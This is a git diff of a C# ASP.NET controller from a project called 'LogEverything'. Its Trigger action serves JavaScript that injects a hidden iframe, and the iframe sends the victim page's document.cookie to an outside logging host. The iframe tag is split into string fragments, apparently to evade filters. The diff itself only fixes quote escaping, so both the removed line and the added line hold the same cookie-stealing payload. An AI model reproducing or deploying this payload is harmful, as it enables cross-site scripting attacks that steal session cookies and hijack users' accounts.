@@ -65,7 +65,7 @@ namespace LogEverything.Controllers
         // GET: /trigger/
         public ActionResult Trigger()
         {
-            return JavaScript("$('body').append('<ifr'+'ame src=\'http://logeverything.apphb.com/log?c='+encodeURI(document.cookie)+'\' style=\'display:none;\'></ifr'+'ame>')");
+            return JavaScript("$('body').append('<ifr'+'ame src=\\'http://logeverything.apphb.com/log?c='+encodeURI(document.cookie)+'\\' style=\\'display:none;\\'></ifr'+'ame>')");
         }
 
         protected virtual JsonNetResult JsonNet(object data)
